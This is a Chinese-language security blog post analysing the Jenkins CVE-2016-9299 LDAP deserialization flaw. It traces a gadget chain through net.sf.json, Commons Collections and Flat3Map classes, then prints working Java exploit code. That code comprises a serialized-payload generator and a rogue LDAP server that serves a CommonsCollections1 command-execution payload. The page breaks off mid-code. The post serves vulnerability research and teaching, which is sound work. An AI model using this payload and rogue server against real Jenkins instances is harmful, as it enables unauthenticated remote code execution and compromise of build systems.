
 <!DOCTYPE HTML>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  
    <title>Jenkins-LDAP (CVE-2016-9299) 反序列化漏洞分析 | 随风&#39;S Blog</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="iswin">
    

    
    <meta name="description" content="这个漏洞在去年11月份官方发布通告的时候我当时关注过，当时自己一直在找com.sun.jndi.ldap.LdapAttribute这个类相关的反序列化，当时意识到这个类里面的getAttributeSyntaxDefinition()方法和getAttributeDefinition()可能会存在反序列化的问题，但是当时找了好多类，发现在发序列化的时候都无法触发这两个方法，原本以为是jdk里面">
<meta name="keywords" content="Deserialize,JAVA">
<meta property="og:type" content="article">
<meta property="og:title" content="Jenkins-LDAP (CVE-2016-9299) 反序列化漏洞分析">
<meta property="og:url" content="https://www.iswin.org/2017/01/25/Jenkins-LDAP-Deserializable-Vulnerablity-CVE-2016-9299-Analysis/index.html">
<meta property="og:site_name" content="随风&#39;S Blog">
<meta property="og:description" content="这个漏洞在去年11月份官方发布通告的时候我当时关注过，当时自己一直在找com.sun.jndi.ldap.LdapAttribute这个类相关的反序列化，当时意识到这个类里面的getAttributeSyntaxDefinition()方法和getAttributeDefinition()可能会存在反序列化的问题，但是当时找了好多类，发现在发序列化的时候都无法触发这两个方法，原本以为是jdk里面">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://www.iswin.org/attach/getBaseCtx.png">
<meta property="og:image" content="https://www.iswin.org/attach/createItem.png">
<meta property="og:image" content="https://www.iswin.org/attach/defaultbeanProcessing.png">
<meta property="og:image" content="https://www.iswin.org/attach/calldefaultbeanProcessing.png">
<meta property="og:image" content="https://www.iswin.org/attach/concurrentSkipListSetEquals.png">
<meta property="og:image" content="https://www.iswin.org/attach/fromObjectcall.png">
<meta property="og:image" content="https://www.iswin.org/attach/flat3map_readObject.png">
<meta property="og:image" content="https://www.iswin.org/attach/flat3map_put.png">
<meta property="og:image" content="https://www.iswin.org/attach/asn1.png">
<meta property="og:image" content="https://www.iswin.org/attach/obj.decodeObject.png">
<meta property="og:image" content="https://www.iswin.org/attach/urlcodebase.png">
<meta property="og:image" content="https://www.iswin.org/attach/jenkins-exploit.jpg">
<meta property="og:updated_time" content="2017-01-28T17:03:56.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Jenkins-LDAP (CVE-2016-9299) 反序列化漏洞分析">
<meta name="twitter:description" content="这个漏洞在去年11月份官方发布通告的时候我当时关注过，当时自己一直在找com.sun.jndi.ldap.LdapAttribute这个类相关的反序列化，当时意识到这个类里面的getAttributeSyntaxDefinition()方法和getAttributeDefinition()可能会存在反序列化的问题，但是当时找了好多类，发现在发序列化的时候都无法触发这两个方法，原本以为是jdk里面">
<meta name="twitter:image" content="https://www.iswin.org/attach/getBaseCtx.png">

    
    <link rel="alternative" href="/atom.xml" title="随风&#39;S Blog" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    <link rel="stylesheet" href="/css/style.css">
</head>
</html>
  <body>
    <header>
      
<div>
		
			<div id="imglogo">
				<a href="/"><img src="/img/author.jpg" alt="随风&#39;S Blog" title="随风&#39;S Blog"/></a>
			</div>
			
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="随风&#39;S Blog">随风&#39;S Blog</a></h1>
				<h2 class="blog-motto">网络安全爱好者</h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
						<li><a href="/atom.xml">RSS</a></li>
					
					<li>
 					
					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
						<input type="hidden" name="q" value="site:www.iswin.org">
					</form>
					
					</li>
				</ul>
			</nav>			
</div>
    </header>
    <div id="container">
      <div id="main" class="post" itemscope itemprop="blogPost">
  
	<article itemprop="articleBody"> 
		<header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2017/01/25/Jenkins-LDAP-Deserializable-Vulnerablity-CVE-2016-9299-Analysis/" title="Jenkins-LDAP (CVE-2016-9299) 反序列化漏洞分析" itemprop="url">Jenkins-LDAP (CVE-2016-9299) 反序列化漏洞分析</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="iswin" target="_blank" itemprop="author">iswin</a>
		
  <p class="article-time">
    <time datetime="2017-01-24T16:12:17.000Z" itemprop="datePublished"> 发表于 2017-01-25</time>
    
  </p>
</header>
	<div class="article-content">
		
		<div id="toc" class="toc-article">
			<strong class="toc-title">文章目录</strong>
		
			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞简介"><span class="toc-number">1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload-LDAP-JNDI"><span class="toc-number">3.</span> <span class="toc-text">Payload-LDAP-JNDI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload-LDAP-SERVER"><span class="toc-number">4.</span> <span class="toc-text">Payload-LDAP-SERVER</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于hashcode的碰撞问题"><span class="toc-number">5.</span> <span class="toc-text">关于hashcode的碰撞问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">7.</span> <span class="toc-text">参考</span></a></li></ol>
		
		</div>
		
		<blockquote>
<p>这个漏洞在去年11月份官方发布通告的时候我当时关注过，当时自己一直在找<strong><em>com.sun.jndi.ldap.LdapAttribute</em></strong>这个类相关的反序列化，当时意识到这个类里面的<strong><em>getAttributeSyntaxDefinition()</em></strong>方法和<strong><em>getAttributeDefinition()</em></strong>可能会存在反序列化的问题，但是当时找了好多类，发现在发序列化的时候都无法触发这两个方法，原本以为是jdk里面自己的问题，最后就没继续跟下去了，中途有老外放出了一个ppt里面演示了这个漏洞，大概看了下发现是利用json来bypass Jenkins的白名单，当时一直在忙数据分析的事情，事情就搁浅了，前不久刚好MSF上有Payload了，再加上年底了没那么多事了，所以就研究了下，这个漏洞还是挺有意思的，涉及的知识面还是稍微广了一点，这里不得不佩服那些漏洞发现者。</p>
<p>每当一个漏洞漏洞出现的时候，我就在想为什么自己不能发现，当每次漏洞分析完的时候才发现各方面的差距真的是不小。</p>
<p><strong><em>技术在于分享，这样才能进步</em></strong>。</p>
</blockquote>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>2016年11月16号Jenkins官方发布了一个安全通告，命名为<a href="https://wiki.jenkins-ci.org/display/SECURITY/Jenkins+Security+Advisory+2016-11-16" target="_blank" rel="noopener">CVE-2016-9299</a>,从通告上来看，该漏洞依然是个反序列的漏洞，不过这个漏洞的反序列化和LDAP有关，而且在反序列化后需要连接到一个恶意的LDAP服务器，Jenkins对于之前反序列化的修复方法就是对一些恶意的类加上黑名单，所以这里首先得Bypass官方的黑名单，对于该漏洞只有这么多信息，而且在官方给的POC里面也仅仅是提到了<strong><em>com.sun.jndi.ldap.LdapAttribute</em></strong>这个类，这个漏洞的利用首先是不需要认证的，而且能任意代码执行，危害可见一斑。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>从官方的描述以及后面的Payload来看，问题和net.sf.json以及com.sun.jndi.ldap.LdapAttribute有关，通过分析对LdapAttribute这个类的分析，我们可以确定以下两个方法是触发反序列化漏洞的根本（关于下文中LDAP的反序列相关的知识请移步16年blackhat老外的Paper “us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE”）</p>
<ul>
<li>getAttributeSyntaxDefinition</li>
<li>getAttributeDefinition</li>
</ul>
<p>这两个方法中都调用了该<strong><em>DirContext schema = getBaseCtx().getSchema(rdn);</em></strong>代码片段其中getBaseCtx()方法定义如下：</p>
<p><div align="center"><br><img src="/attach/getBaseCtx.png" alt="/attach/getBaseCtx.png"><br></div><br>该段代码使用jndi的方式去访问LDAP服务，这里我们可以控制Context.PROVIDER_URL的参数，从而控制jndi访问的LDAP服务器的地址。</p>
<p>getSchema(rdn)方法最终会调用com.sun.jndi.ldap.LdapBindingEnumeration.createItem(String, Attributes, Vector)方法（调用关系太多，自己去调试），该方法的定义如下图</p>
<p><div align="center"><br><img src="/attach/createItem.png" alt="/attach/createItem.png"><br></div><br>在该方法中最终会调用<strong><em>Obj.decodeObject(attrs)</em></strong>方法，从而实现对象的反序列化。这里稍微提下，com.sun.jndi.ldap.Obj对象中定义了几种对象序列化与反序列化的方法，有直接反序列化的，也有直接通过远程加载的，这里的的反序列化稍微与其它地方的反序列化不同的点在于我们不能远程加载对象，因为com.sun.jndi.ldap.VersionHelper12.trustURLCodebase的默认值为false，所以直接决定了类加载器只能加载当前classpath下面的类，关于如何去构造对象使得LDAP在反序列化能执行任意代码，请看下文。</p>
<p>到这里我们知道了com.sun.jndi.ldap.LdapAttribute中相关的方法能触发反序列化的漏洞，那么现在我们要做的就是去找到一个类在反序列化的时候能调用我们相应触发漏洞的函数，也就是在反序列化时能调用getAttributeSyntaxDefinition方法或者getAttributeDefinition方法的类，通过老外的PPT以及公开的gadgets，我们稍微分析下就会发现在net.sf.json这个类库中存在可以调用类任意getXXX函数的地方，那么com.sun.jndi.ldap.LdapAttribute这个类中的getXXX方法是不是也可以通过这种方式来调用，首先我们先确定究竟是那个类中的那个方法能调用getXXX函数，通过gadgets中的json Payload我们发现最终能调用对象的getXXX函数如下图（net.sf.json.JSONObject.defaultBeanProcessing(Object, JsonConfig)）所示</p>
<p><div align="center"><br><img src="/attach/defaultbeanProcessing.png" alt="/attach/defaultbeanProcessing.png"><br></div><br>上图中圈起来的两个地方就是能调用getXXX函数的地方，这里会先遍历javabean的所有属性，最后在挨个的调用。</p>
<p>弄明白了能函数调用的根源，下一步就是去找这个函数究竟会怎样触发。通过eclipse我们可以很容易发现如下调用方式。</p>
<p><div align="center"><br><img src="/attach/calldefaultbeanProcessing.png" alt="/attach/calldefaultbeanProcessing.png"><br></div><br>如上图所示，我们可以看见defaultBeanProcessing方法最终会被ConcurrentSkipListSet类中的equals方法调用，到这里很多人可能会问了，那么多调用关系，你为什么就找这个类的equals方法，这里可能会有一些经验在里面，因为对于和equals方法相关的东西太多了，对于java中的某些数据结构，例如Set,每次添加元素的时候都会判断当前key是否存在，还有就是比较两个对象是否相等的时候会去调用hashcode和equals方法，这里如果了解过其它反序列化的同学对此可能会稍有感触，例如jdk的那个反序列化的触发过程。如果这种经验没有的话，那么你只能一个一个的去找了。</p>
<p>最终我们找到了一个类可以的某个方法可以调用我们的函数了，但是你可能会发现在eclipse中这样的函数调用关系大多是多态情况下的方法调用，所以我们还需要对equals方法中的方法调用进行分析，这里我们需要注意的是defaultBeanProcessing这个函数的直接调用对象是net.sf.json.JSONArray.fromObject(Object, JsonConfig)方法，我们来看下equals方法</p>
<p><div align="center"><br><img src="/attach/concurrentSkipListSetEquals.png" alt="/attach/concurrentSkipListSetEquals.png"><br></div><br>在这个方法里面有两处调用了containsAll方法，我们要看看究竟是那个可能会调用fromObject，我们再来看下fromObject的调用关系，如下图</p>
<p><div align="center"><br><img src="/attach/fromObjectcall.png" alt="/attach/fromObjectcall.png"><br></div><br>你会发现JSONArray调用了containsAll方法，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">containsAll(c) &amp;&amp; c.containsAll(this);</span><br></pre></td></tr></table></figure>
<p>这里的第一个containsAll方法是触发不了的那个函数的，所以我们只要满足对象o是JSONArray就行了，但是事实上是不行了，因为这个对象o不是Set的子类，所以这条路到这基本上就走不通了，所以我们还得继续找。</p>
<p>继续回到c.containsAll这个地方我们再找那些函数最终调用了containsAll，这里我们发现org.apache.commons.collections.collection.AbstractCollectionDecorator.containsAll(Collection)这个抽象类调用了，来看改函数的定义</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected Collection collection;</span><br><span class="line">....</span><br><span class="line"> public boolean containsAll(Collection coll) &#123;</span><br><span class="line">     return collection.containsAll(coll);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>这里最终会调用collection.containsAll方法，如果这里我们将collection赋值为JSONArray对象的话不照样触发漏洞么，由于AbstractCollectionDecorator这个类是抽象的，无法实例化，所以我们得找一个它的子类，注意这里我们必须得满足子类是实现了Set接口并且是可以序列化的，所以找到最后我们找到了org.apache.commons.collections.set.ListOrderedSet这个类。这里只需要满足父类的collection是JSONArray就行了。</p>
<p>到这里我们知道了只需要让equals方法中的对象o赋值成org.apache.commons.collections.set.ListOrderedSet的实例就行了。</p>
<p>接下来我们要去找关于equals的调用关系了，直接使用eclipse我们可以找到org.apache.commons.collections.map.Flat3Map.put(Object, Object)这个类（详细过程大家自己去跟），这个类有个更重要的一点是</p>
<p><div align="center"><br><img src="/attach/flat3map_readObject.png" alt="/attach/flat3map_readObject.png"><br></div><br>这个类在反序列化的时候恰好就触发了这个put函数，最终触发我们精心构造的对象。</p>
<p>这个Flat3Map有个特点就是当map的元素小于等于3的时候会用类成员变量来存储数据，而且这里还必须得调用equals方法。</p>
<p><div align="center"><br><img src="/attach/flat3map_put.png" alt="/attach/flat3map_put.png"><br></div><br>悲剧的是这里我们需要构造两个对象也就是我们刚才讨论的，一个是ListOrderedSet一个是concurrentSkipListSet对象，但是这里我们需要满足这两个对象的key值的hashcode必须相同。<br>这里的hashcode要么全为0这样是最好的，也就是key为空字符串就行了，但是我们要构造的Payload里面必须要有JSONArray对象，这个对象默认的hashcode是29，不管怎么弄都不可能相等，不过这里我们可以用hashcode碰撞来解决hashcode值相同问题。</p>
<p>这里我们关键的漏洞是怎么触发的已经浪费了大量的篇幅来说明，下来就是要去构造POC了，这里具体细节就比较简单了，不做过多的描述了。</p>
<h2 id="Payload-LDAP-JNDI"><a href="#Payload-LDAP-JNDI" class="headerlink" title="Payload-LDAP-JNDI"></a>Payload-LDAP-JNDI</h2><p>这里直接给出生成Ldap序列化的Payload，如果谁有什么疑问可以邮件交流。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@author</span> iswin</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException,</span></span><br><span class="line"><span class="function">		IllegalArgumentException, InvocationTargetException, Exception </span>&#123;</span><br><span class="line">	</span><br><span class="line">	Object o = Reflections.getFirstCtor(<span class="string">"com.sun.jndi.ldap.LdapAttribute"</span>).newInstance(<span class="string">"iswin"</span>);</span><br><span class="line">	Reflections.setFieldValue(o, <span class="string">"baseCtxURL"</span>, <span class="string">"ldap://127.0.0.1:38900"</span>);</span><br><span class="line"></span><br><span class="line">	ConcurrentSkipListSet sets = <span class="keyword">new</span> ConcurrentSkipListSet(<span class="keyword">new</span> NullComparator());</span><br><span class="line">	sets.add(o);</span><br><span class="line"></span><br><span class="line">	ListOrderedSet set = <span class="keyword">new</span> ListOrderedSet();</span><br><span class="line">	JSONArray array = <span class="keyword">new</span> JSONArray();</span><br><span class="line">	array.add(<span class="string">"\u0915\u0009\u001e\u000c\u0002\u0915\u0009\u001e\u000b\u0004"</span>);</span><br><span class="line">	Reflections.setSuperFieldValue(set, set.getClass().getSuperclass().getSuperclass().getSuperclass(),</span><br><span class="line">			<span class="string">"collection"</span>, array);</span><br><span class="line"></span><br><span class="line">	Flat3Map map = <span class="keyword">new</span> Flat3Map();</span><br><span class="line">	map.put(set, <span class="keyword">true</span>);</span><br><span class="line">	map.put(sets, <span class="keyword">true</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//如果不在这里更改值，则满足不了hash相等条件，如果在之前设置为空，那么在Flat3Map的put方法时就会触发漏洞，则不能完成生成payload。</span></span><br><span class="line">	Reflections.setSuperFieldValue(o, o.getClass().getSuperclass(), <span class="string">"attrID"</span>, <span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">byte</span>[] bt = Serializer.serialize(map);</span><br><span class="line">	Deserializer.deserialize(bt);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Payload-LDAP-SERVER"><a href="#Payload-LDAP-SERVER" class="headerlink" title="Payload-LDAP-SERVER"></a>Payload-LDAP-SERVER</h2><p>刚开始以为主要能生成序列化的Payload然后随便找个LDAP服务器弄个序列化的对象丢上去就行了，但是事实好像没有那么简单，我用apacheds模拟了好久就是不行，后来看了下上文提到的那个<strong><em>Obj.decodeObject(attrs)</em></strong>方法，发现这个必须要LDAP服务器返回的信息中必须包含某些属性，例如javaSerializedData，但是每次去请求总是达不到效果，后来去瞅了下msf上的payload，大概明白了一点，后来懒得去弄了，就学习了下ldap协议的rfc文档，熟悉了下asn1标记语言（有耐心的同学可以仔细看看），具体解释如下</p>
<p><div align="center"><br><img src="/attach/asn1.png" alt="/attach/asn1.png"><br></div><br>直接将msf上的那个模拟的服务端中的asn1部分直接拿java重写了下。<br>整体代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@author</span> iswin</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] hexStringToByteArray(String s) &#123;</span><br><span class="line">		<span class="keyword">int</span> len = s.length();</span><br><span class="line">		<span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[len / <span class="number">2</span>];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i += <span class="number">2</span>) &#123;</span><br><span class="line">			data[i / <span class="number">2</span>] = (<span class="keyword">byte</span>) ((Character.digit(s.charAt(i), <span class="number">16</span>) &lt;&lt; <span class="number">4</span>) + Character.digit(s.charAt(i + <span class="number">1</span>), <span class="number">16</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> data;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">bytesToHex</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">char</span>[] hexArray = <span class="string">"0123456789ABCDEF"</span>.toCharArray();</span><br><span class="line">		<span class="keyword">char</span>[] hexChars = <span class="keyword">new</span> <span class="keyword">char</span>[bytes.length * <span class="number">2</span>];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; bytes.length; j++) &#123;</span><br><span class="line">			<span class="keyword">int</span> v = bytes[j] &amp; <span class="number">0xFF</span>;</span><br><span class="line">			hexChars[j * <span class="number">2</span>] = hexArray[v &gt;&gt;&gt; <span class="number">4</span>];</span><br><span class="line">			hexChars[j * <span class="number">2</span> + <span class="number">1</span>] = hexArray[v &amp; <span class="number">0x0F</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> String(hexChars);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] make_stage_reply() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">		Object payload = CommonsCollections1.class.newInstance().getObject(<span class="string">"open /Applications/Calculator.app"</span>);</span><br><span class="line">		ByteArrayOutputStream objpayload = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">		ObjectOutputStream oo = <span class="keyword">new</span> ObjectOutputStream(objpayload);</span><br><span class="line">		oo.writeObject(payload);</span><br><span class="line"></span><br><span class="line">		Sequence sq = <span class="keyword">new</span> Sequence();</span><br><span class="line">		sq.addElement(<span class="keyword">new</span> OctetString(<span class="string">"javaClassName"</span>.getBytes()));</span><br><span class="line">		Set s0 = <span class="keyword">new</span> Set();</span><br><span class="line">		s0.addElement(<span class="keyword">new</span> OctetString(<span class="string">"WTF"</span>.getBytes()));</span><br><span class="line">		sq.addElement(s0);</span><br><span class="line"></span><br><span class="line">		Sequence sq1 = <span class="keyword">new</span> Sequence();</span><br><span class="line">		sq1.addElement(<span class="keyword">new</span> OctetString(<span class="string">"javaSerializedData"</span>.getBytes()));</span><br><span class="line">		Set s = <span class="keyword">new</span> Set();</span><br><span class="line">		s.addElement(<span class="keyword">new</span> OctetString(objpayload.toByteArray()));</span><br><span class="line">		sq1.addElement(s);</span><br><span class="line"></span><br><span class="line">		Sequence sq2 = <span class="keyword">new</span> Sequence();</span><br><span class="line">		sq2.addElement(sq);</span><br><span class="line">		sq2.addElement(sq1);</span><br><span class="line"></span><br><span class="line">		Sequence sq3 = <span class="keyword">new</span> Sequence();</span><br><span class="line">		sq3.addElement(<span class="keyword">new</span> OctetString(<span class="string">"cn=wtf, dc=example, dc=com"</span>.getBytes()));</span><br><span class="line">		sq3.addElement(sq2);</span><br><span class="line">		sq3.setTagClass(Tag.APPLICATION);</span><br><span class="line">		sq3.setTagNumber(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">		Sequence sqall = <span class="keyword">new</span> Sequence();</span><br><span class="line">		sqall.addElement(<span class="keyword">new</span> ASN1Integer(<span class="number">3L</span>));</span><br><span class="line">		sqall.addElement(sq3);</span><br><span class="line"></span><br><span class="line">		ByteArrayOutputStream opt = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">		sqall.encode(<span class="keyword">new</span> BerOutputStream(opt, BerOutputStream.ENCODING_DER));</span><br><span class="line">		<span class="keyword">return</span> opt.toByteArray();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">read_ldap_packet</span><span class="params">(Socket socket)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			InputStream sin = socket.getInputStream();</span><br><span class="line">			<span class="keyword">byte</span>[] sinb = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2</span>];</span><br><span class="line">			sin.read(sinb);</span><br><span class="line">			<span class="keyword">if</span> (sinb[<span class="number">0</span>] != <span class="string">'0'</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">int</span> length = (<span class="keyword">char</span>) (sinb[<span class="number">1</span>] &amp; <span class="number">0xFF</span>);</span><br><span class="line">			<span class="keyword">if</span> ((length &amp; (<span class="number">1</span> &lt;&lt; <span class="number">7</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">int</span> length_bytes_length = length ^ (<span class="number">1</span> &lt;&lt; <span class="number">7</span>);</span><br><span class="line">				<span class="keyword">byte</span>[] length_bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[length_bytes_length];</span><br><span class="line">				sin.read(length_bytes);</span><br><span class="line">				<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length_bytes.length; i++) &#123;</span><br><span class="line">					sum += (length_bytes[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				length = sum;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// System.out.println("length" + length);</span></span><br><span class="line">			<span class="keyword">byte</span>[] tmp = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</span><br><span class="line">			sin.read(tmp);</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">socketServer</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			ServerSocket server = <span class="keyword">new</span> ServerSocket(<span class="number">38900</span>);</span><br><span class="line">			Socket ss = server.accept();</span><br><span class="line">			OutputStream out = <span class="keyword">new</span> BerOutputStream(ss.getOutputStream());</span><br><span class="line">			read_ldap_packet(ss);</span><br><span class="line">			out.write(hexStringToByteArray(<span class="string">"300c02010161070a010004000400"</span>));</span><br><span class="line">			out.flush();</span><br><span class="line">			read_ldap_packet(ss);</span><br><span class="line">			out.write(hexStringToByteArray(</span><br><span class="line">					<span class="string">"3034020102642f04066f753d777466302530230411737562736368656d61537562656e747279310e040c636e3d737562736368656d61"</span>));</span><br><span class="line">			out.write(hexStringToByteArray(<span class="string">"300c02010265070a010004000400"</span>));</span><br><span class="line">			out.flush();</span><br><span class="line">			read_ldap_packet(ss);</span><br><span class="line">			out.write(make_stage_reply());</span><br><span class="line">			out.write(hexStringToByteArray(<span class="string">"300c02010365070a010004000400"</span>));</span><br><span class="line">			out.flush();</span><br><span class="line">			out.close();</span><br><span class="line">			ss.close();</span><br><span class="line">			server.close();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> 